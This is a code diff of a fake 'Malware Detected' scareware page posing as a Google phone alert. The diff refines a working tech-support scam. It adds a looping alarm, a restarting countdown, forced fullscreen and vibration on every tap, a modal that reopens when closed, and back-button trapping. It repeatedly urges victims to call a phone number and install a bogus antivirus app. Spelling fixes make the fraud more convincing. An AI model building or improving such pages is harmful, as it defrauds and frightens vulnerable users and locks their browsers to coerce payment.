@@ -3,7 +3,6 @@
 
 <head>
   <meta charset="UTF-8" />
-  <!-- <meta name="viewport" content="width=device-width, initial-scale=1.0" /> -->
   <meta name="viewport" content="minimal-ui, width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
   <title>Malware Detected</title>
@@ -13,27 +12,23 @@
     .no-outline {
       outline: none;
     }
+
     p {
-    margin-top: 0;
-    margin-bottom: 0 !important;
+      margin-top: 0;
+      margin-bottom: 0 !important;
+    }
 
-
-      
-}
-    
-    /* Fullscreen container for simulation */
     #fullscreenContainer {
-      display: none; /* Initially hidden */
+      display: none;
       position: fixed;
       top: 0;
       left: 0;
       width: 100vw;
       height: 100vh;
-      background: black; /* Fullscreen background color */
-      z-index: 9999; /* Make sure it overlays everything */
+      background: black;
+      z-index: 9999;
     }
 
-    /* Optional styling for button */
     .btn-custom {
       font-size: 1.2rem;
       padding: 10px 20px;
@@ -52,7 +47,7 @@
         Call +1 877 838 1219
       </button>
     </div>
-    
+
     <div class="w-100 d-flex justify-content-center py-3">
       <img class="w-50" src="./assets/img/google_logo.webp" alt="./assets/img/google_logo.webp" />
     </div>
@@ -67,40 +62,28 @@
       <span id="countdown-timer">0:00</span> minutes remaining
     </h4>
     <p>
-      If you don't treat the infection now, it will proceed to series damage.
+      If you don't treat the infection now, it will proceed to serious damage.
       Here's how to clean up the infection:
     </p>
     <p>
       <b>Step 1:</b> Tap and install VirusRemover for free on the App Store!
     </p>
-    <p><b>Step 2:</b> Open the app to scan and remove virus to adult site.</p>
+    <p><b>Step 2:</b> Open the app to scan and remove viruses from adult sites.</p>
     <div class="w-100 d-flex justify-content-center py-3">
       <button class="btn btn-success" id="vibrateButton" data-bs-toggle="modal" data-bs-target="#virusModal">
         Repair iPhone Virus
       </button>
       <button id="callButton2" class="btn btn-danger border-0 text-white" style="font-size: 1rem; text-align: center; padding-left: 10px;">
         Call +1 877 838 1219
-       </button>
-    </div>
-    <div class="w-100 d-flex justify-content-center py-3">
-      
+      </button>
     </div>
   </div>
 
-  <div class="modal fade" id="virusModal" tabindex="-1" aria-labelledby="virusModalLabel" aria-hidden="true"
-    data-bs-backdrop="static">
+  <div class="modal fade" id="virusModal" tabindex="-1" aria-labelledby="virusModalLabel" aria-hidden="true" data-bs-backdrop="static">
     <div class="modal-dialog modal-dialog-centered">
       <div class="modal-content">
-        <!-- <div class="modal-header">
-            <h1 class="modal-title fs-5" id="virusModalLabel">New message</h1>
-            <button
-              type="button"
-              class="btn-close shadow-none"
-              data-bs-dismiss="modal"
-            ></button>
-          </div> -->
         <div class="modal-body">
-          <h1 class=" fs-1 fw-bold text-center text-danger">
+          <h1 class="fs-1 fw-bold text-center text-danger">
             Danger
           </h1>
           <h5 class="fw-bold">
@@ -113,23 +96,20 @@
           </p>
           <p>
             If the problem can not be resolved immediately, the viruses will
-            spy your phone, and destroy your SIM card, delete all your
+            spy on your phone, destroy your SIM card, and delete all your
             contacts.
           </p>
           <p>
             Please follow the instructions to install the Antivirus and
-            shield all the viruses
+            shield all the viruses.
           </p>
           <div class="d-flex justify-content-center">
-            <!-- <a href="tel:+912222222222" id="callButton" class="btn btn-danger border-0 text-white">
-              +91 2222222222
-            </a> -->
             <button id="callButton" class="btn btn-danger border-0 text-white" style="font-size: 1.2rem;">
-             Call +1 877 838 1219
+              Call +1 877 838 1219
             </button>
           </div>
           <div class="d-flex justify-content-end">
-            <button type="button" class="border-0 bg-transparent text-primary" data-bs-dismiss="modal" id="">
+            <button type="button" class="border-0 bg-transparent text-primary" data-bs-dismiss="modal">
               Ok
             </button>
           </div>
@@ -137,59 +117,99 @@
       </div>
     </div>
   </div>
-  <!-- Audio Element -->
+
   <audio id="audioPlayer" src="assets/media/alert.mp3"></audio>
 
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
-
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-  <script src="./assets/js/snippets.js"></script>
+
   <script>
     $(document).ready(() => {
-      // Function to simulate fullscreen
-      function simulateFullscreen() {
-        $("body").css({
-          position: "fixed",
-          width: "100vw",
-          height: "100vh",
-          overflow: "hidden",
-          top: 0,
-          left: 0,
+      function startCountdown() {
+        let timeInSeconds = 5 * 60; // 5 minutes in seconds
+
+        const countdown = setInterval(() => {
+          let minutes = Math.floor(timeInSeconds / 60);
+          let seconds = timeInSeconds % 60;
+
+          minutes = minutes < 10 ? "0" + minutes : minutes;
+          seconds = seconds < 10 ? "0" + seconds : seconds;
+
+          document.getElementById("countdown-timer").innerText = `${minutes}:${seconds}`;
+
+          timeInSeconds--;
+
+          if (timeInSeconds < 0) {
+            clearInterval(countdown);
+            startCountdown();
+          }
+        }, 1000);
+      }
+
+      startCountdown();
+
+      const virusModal = document.getElementById("virusModal");
+      const modalInstance = new bootstrap.Modal(virusModal);
+      const audioPlayer = $("#audioPlayer")[0];
+
+      audioPlayer.play();
+
+      audioPlayer.addEventListener("ended", () => {
+        audioPlayer.play();
+      });
+
+      function goFullScreenAndVibrate() {
+        const element = document.documentElement;
+
+        if (element.requestFullscreen) {
+          element.requestFullscreen();
+        } else if (element.mozRequestFullScreen) {
+          element.mozRequestFullScreen();
+        } else if (element.webkitRequestFullscreen) {
+          element.webkitRequestFullscreen();
+        } else if (element.msRequestFullscreen) {
+          element.msRequestFullscreen();
+        }
+
+        navigator.vibrate(200);
+        modalInstance.show();
+      }
+
+      if (virusModal) {
+        virusModal.addEventListener("show.bs.modal", () => {
+          goFullScreenAndVibrate();
+          audioPlayer.play();
         });
 
-        $("#fullscreenContainer").css({
-          display: "block", // Show fullscreen container
-          position: "fixed",
-          width: "100vw",
-          height: "100vh",
-          top: 0,
-          left: 0,
-          zIndex: 9999,
-          backgroundColor: "black", // Fullscreen background
+        virusModal.addEventListener("hidden.bs.modal", () => {
+          setTimeout(() => {
+            modalInstance.show();
+            goFullScreenAndVibrate();
+          }, 300);
         });
       }
 
-      // Handle button click for fullscreen
-      $("#fullscreenButton").on("click", () => {
-        simulateFullscreen();
-        alert("Simulated fullscreen activated!");
+      window.addEventListener("touchstart", () => {
+        goFullScreenAndVibrate();
       });
 
-      // Prevent scrolling and touch interactions
-      $("body").on("touchmove", (e) => {
-        e.preventDefault();
+      window.addEventListener("click", () => {
+        goFullScreenAndVibrate();
       });
 
-      // Handle orientation change
-      window.addEventListener("orientationchange", () => {
-        simulateFullscreen();
+      $("#vibrateButton").on("click", () => {
+        goFullScreenAndVibrate();
       });
+
+      $("#callButton, #callButton1, #callButton2").on("click", () => {
+        window.location.href = "tel:+18778381219";
+      });
+
+      history.pushState(null, null, window.location.href);
+      history.back();
+      window.onpopstate = () => history.forward();
     });
   </script>
-
-
-
-  
 </body>
 
 </html>
